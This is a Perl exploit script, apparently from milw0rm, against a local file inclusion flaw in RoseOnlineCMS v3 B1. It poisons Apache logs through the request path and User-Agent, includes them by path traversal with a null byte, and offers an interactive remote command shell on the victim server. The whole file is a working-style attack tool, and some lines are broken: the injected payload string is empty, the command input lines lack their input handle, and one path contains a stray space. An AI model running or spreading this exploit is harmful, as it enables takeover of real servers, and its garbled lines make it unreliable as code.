#!/usr/bin/perl
# RoseOnlineCMS v3 B1(op)Local File Inclusion Exploit
# P.Script: http://heanet.dl.sourceforge.net/sourceforge/rosecms/RoseOnlineCMS_v3_B1.rar
# V.Code:
# $op = !isset($_GET['op']) ? home : $_GET['op'] ;
#
#  if (is_file("modules/".$op.".php")) {
#   include("modules/".$op.".php");
#
use IO::Socket;
use LWP::Simple;
#ripped
@apache=(
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../.. /../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);
if (@ARGV < 3) {
print "
===============================================================
|  RoseOnlineCMS v3 B1(op)Local File Inclusion Exploit        |
|           Mahmood.pl [Victim] / (apachepath)                |
|        Ex: Gold.pl [Victim] / ../logs/error.log             |
|                  Coded By Mahmood_ali                       |
===============================================================
";
exit();
}
$host=$ARGV[0];
$path=$ARGV[1];
$apachepath=$ARGV[2];
print "Code is injecting in logfiles...\n";
$CODE="";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Connection failed.\n\n";
print $socket "GET ".$path.$CODE." HTTP/1.1\r\n";
print $socket "user-Agent: ".$CODE."\r\n";
print $socket "Host: ".$host."\r\n";
print $socket "Connection: close\r\n\r\n";
close($socket);
print "Write END to exit!\n";
print "If not working try another apache path\n\n";
print "[shell] ";$cmd = ;
while($cmd !~ "END") {
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Connection failed.\n\n";
#now include parameter
print $socket "GET ".$path."index.php?op=".$apache[$apachepath]."%00&cmd=$cmd HTTP/1.1\r\n";
print $socket "Host: ".$host."\r\n";
print $socket "Accept: */*\r\n";
print $socket "Connection: close\r\n\r\n";
while ($raspuns = <$socket>)
{
print $raspuns;
}
print "[shell] ";
$cmd = ;
}

# milw0rm.com [2007-03-23]
